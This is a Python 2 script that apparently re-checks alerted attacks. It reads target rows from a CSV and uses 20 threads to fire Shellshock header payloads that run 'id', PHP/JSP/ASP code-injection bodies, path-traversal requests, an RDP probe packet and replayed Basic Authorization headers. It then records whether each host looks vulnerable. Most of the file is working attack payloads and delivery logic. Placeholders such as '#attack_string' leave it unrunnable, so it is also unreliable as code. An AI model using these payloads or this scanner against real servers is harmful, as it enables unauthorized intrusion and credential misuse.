###########################################
# /usr/bin/sh
# made by jackson
# python scan.py 
###########################################

import re
from openpyxl import Workbook
import requests,csv
import urllib2
import socket
from threading import Thread
from Queue import Queue
import urllib3

urllib3.disable_warnings()
readfile = #read_file_csv
output = #result_file_xlsx
wb = Workbook()
ws = wb.active
check_list = []
container = []
pre_result = []
cnt = 0
HEADER = {'User-Agent':''}
concurrent = 20
openVAS_A1 = "() { _; OpenVAS-VT; } >_[$($())] { echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id; }"
openVAS_A2 = "() { OpenVAS-VT:; }; echo Content-Type: text/plain; echo; echo; PATH=/usr/bin:/usr/local/bin:/bin; export PATH; id;"
p = re.compile('Basic\s+[a-zA-Z0-9]+={0,30}')
P_data = "<?php echo #attack_string;?>"
J_data = "<% out.println(#attack_string);%>"
A_data = "<% Response.Write #attack_string; %>"
DATA = ""
RDP_REQUEST = "\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x0b\00\00\00\x48\x41\x4e\x53"

#attack_list_csv -> load check_list after csv/read 
def read_ip_list():
	global cnt
	with open(readfile,'r') as csvreadfile:
		readcsv = csv.reader(csvreadfile)
		for row in readcsv:
			if cnt == 0:
				cnt += 1
			else:
				if str(row[0]) == 'N/A':
					container.append(row)
				else:
					container.append(row)
	return container	

def check_another_attack(URL, METHOD , REFERER, SDATA):
	global openVAS_A1
	global openVAS_A2
	global p
	
	if SDATA.startswith("Cookie: () { _; ",SDATA.find("Cookie: () { _; ")):
		An_data = ["cookies",openVAS_A1]
		return URL, METHOD, REFERER, An_data
	
	elif SDATA.startswith("Cookie: () { O",SDATA.find("Cookie: () { O")):
		An_data = ["cookies",openVAS_A2]
		return URL, METHOD,REFERER, An_data
	
	elif SDATA.startswith("User-Agent: () { O",SDATA.find("User-Agent: () { O")):
		An_data = ["User-Agent",openVAS_A2]
		return URL, METHOD, REFERER, An_data
		
	elif SDATA.startswith("User-Agent: () { _;",SDATA.find("User-Agent: () { _;")):
		An_data = ["User-Agent",openVAS_A1]
		return URL, METHOD,REFERER, An_data
		
	elif SDATA.startswith("OpenVAS-VT: () { O",SDATA.find("OpenVAS-VT: () { O")):
		An_data = ["User-Agent","OpenVAS-VT:"+openVAS_A2]
		return URL, METHOD, REFERER, An_data		
	
	elif SDATA.startswith("OpenVAS-VT: () { _;",SDATA.find("OpenVAS-VT: () { _;")):
		An_data = ["User-Agent","OpenVAS-VT:"+openVAS_A1]
		return URL, METHOD, REFERER, An_data	

	elif URL.startswith(#attack_string,URL.find(#attack_string)):
		An_data = ["Content-Length"," #attack_string </FILE></RECORD>"]
		return URL, METHOD,REFERER, An_data
	
	elif SDATA.startswith("Authorization:",SDATA.find("Authorization:")):
		m = p.findall(SDATA)
		An_data = ["Authorization", m[0] ]
		return URL,METHOD,REFERER, An_data
	else:
		An_data = None
		return URL,METHOD,REFERER, An_data
	
###### thread pool // target//URL request  ######
def check_attack(Check1): 
	global P_data #php body data 
	global J_data #jsp body data
	global A_data #asp body data

	HOST = Check1[0]
	if str(Check1[1]) == "N/A":
		Check1[1] = "/"
	URL = "http://" + Check1[0]+Check1[1]
	METHOD = Check1[2]
	SDATA = Check1[8]
	DESTINATION_PORT = Check1[7]
	REFERER = Check1[3]
	
	if URL.endswith(".php") and SDATA.startswith("/usr/bin:/usr/local/bin",SDATA.find("/usr/bin:/usr/local/bin")) is False:
		restatus_status , restatus_text  = request(URL, METHOD ,REFERER, P_data, None) 
		if restatus_status == 200:
			if restatus_text.find(#string) > -1:
				return URL , METHOD , REFERER, restatus_status, "vulnerable"
			else:
				return URL , METHOD , REFERER, restatus_status, "Not Vulnerable"
		else: 
			return URL , METHOD , REFERER, restatus_status,""


	elif URL.endswith(".asp") and SDATA.startswith("/usr/bin:/usr/local/bin",SDATA.find("/usr/bin:/usr/local/bin")) is False:
		restatus_status , restatus_text= request(URL, METHOD ,REFERER, A_data, None)
		if restatus_status == 200:
			if restatus_text.find(#string) > -1:
				return URL , METHOD , REFERER, restatus_status, "vulnerable"
			else:
				return URL , METHOD , REFERER, restatus_status, "Not Vulnerable"
		else:
			return URL , METHOD , REFERER, restatus_status, ""
			
			
	elif URL.endswith(".jsp") and SDATA.startswith("/usr/bin:/usr/local/bin",SDATA.find("/usr/bin:/usr/local/bin")) is False:
		restatus_status , restatus_text = request(URL, METHOD ,REFERER, J_data, None)
		if restatus_status == 200 :
			if restatus_text.find(#string) > -1:
				return URL , METHOD , REFERER, restatus_status, "vulnerable"
			else:
				return URL , METHOD , REFERER, restatus_status, "Not Vulnerable"
		else:
			return URL , METHOD , REFERER, restatus_status, ""
			
			
	elif URL.startswith('../../',URL.find('../../')): ### LFI testing : need modified ####
		restatus_status , restatus_text = request(URL, METHOD ,REFERER, DATA, None)
		if restatus_status == 200 :
			if restatus_text.find(#string) > -1:
				return URL , METHOD , REFERER, restatus_status, "vulnerable"
			else:
				return URL , METHOD , REFERER, restatus_status, "Not Vulnerable"
		else:
			return URL , METHOD , REFERER, restatus_status,""


	elif str(METHOD) == "N/A" and SDATA.startswith(#string,SDATA.find(#string)):
		if int(DESTINATION_PORT) != 80 or int(DESTINATION_PORT) != 443:
			try:
				s = socket.socket()
				s.settimeout(2.5)
				s.connect((str(HOST),int(DESTINATION_PORT)))
				s.send(RDP_REQUEST)
				response = s.recv(128)
				if(response[0:2]=="\x03\x00"):
					return URL, METHOD, REFERER, "Connected" ,  "vulnerable"
				else:
					pass
			except Exception as e:
				# print e
				s.close()	
		else:
			return URL,METHOD,REFERER, "NOT Connected" , None

	else:
		try:
			URL1,METHOD1,REFERER1,Another_data = check_another_attack(URL, METHOD,REFERER,SDATA)
			restatus_status , restatus_text = request(URL1, METHOD1 ,REFERER1, None , Another_data)
		except Exception as e:
			restatus_status = "not connected"
		
		return URL, METHOD, REFERER, restatus_status ,  None

def request(URL, METHOD, REFERER, DATA2, Another_Value): ##### requests module
	print URL
	cookies=""
	if str(REFERER) != "N/A":
		HEADER['referer'] = REFERER
	else:
		HEADER['referer'] = ""
		
	if Another_Value is not None and Another_Value != "":
		if Another_Value[0] == 'cookies':
			h1_val = Another_Value[1]
			cookies={'Cookie':h1_val}
		elif Another_Value[0] == "Authorization":
			h1_val = Another_Value[1]
			HEADER['Authorization'] = h1_val
		else:
			h1 = Another_Value[0]
			h1_val = Another_Value[1]
			HEADER[h1] = h1_val
	elif Another_Value is None or Another_Value == "":
		HEADER['User-Agent'] = ''
		HEADER['Authorization'] = ""
	
	if str(METHOD) == 'GET':
		try:
			toss = requests.get(url = URL, headers=HEADER, cookies=cookies ,stream=True, verify=False, timeout=5)
			return toss.status_code, toss.text
		except requests.HTTPError, e:
			#print url,e
			return "not Connected" , ""
		except Exception, e:
			return "not Connected" , ""
			#print e
			
	elif str(METHOD) == 'POST':
		try:
			toss = requests.post(url = URL, headers=HEADER, cookies=cookies, data= DATA2, stream=True, verify=False, timeout=5)
			return toss.status_code, toss.text 
		except requests.HTTPError, e:
			#print url,e
			return "not Connected" , ""
		except Exception, e:
			#print e
			return "not Connected" , ""
		
	elif str(METHOD) == 'PUT':
		try:
			with open("test.html") as f:
				data1 = f.read()
				toss = requests.put(url = URL , data=data1, headers=HEADER, verify=False, timeout=5)
				return toss.status_code, toss.text
		except Exception, e:
			#print e
			return "not Connected" , ""
			
def testOpenVAS(check_list):
	result = check_attack(check_list)
	return result

def writeExel(result):
	ws.append(["URL","Method","Referer","Status_code","Check_again"])
	for wr in result:
		ws.append(wr)
	wb.save(output)
	
def threadWork():
	global pre_result
	while True:
		target = q.get()
		result = testOpenVAS(target)
		pre_result.append(result)
		q.task_done()

def scan(check_list):
	global q
	q = Queue(concurrent * 2)
	for i in range(concurrent):
		t = Thread(target=threadWork)
		t.daemon = True
		t.start()
	try:
		for target in check_list:
			q.put(target)
			q.join()
	except KeyboardInterrupt:
		return

def main():
	check_list = read_ip_list()
	scan(check_list)
	
	if output is not None:
		writeExel(pre_result) 
	exit(0)

if __name__ == "__main__":
	main()
	
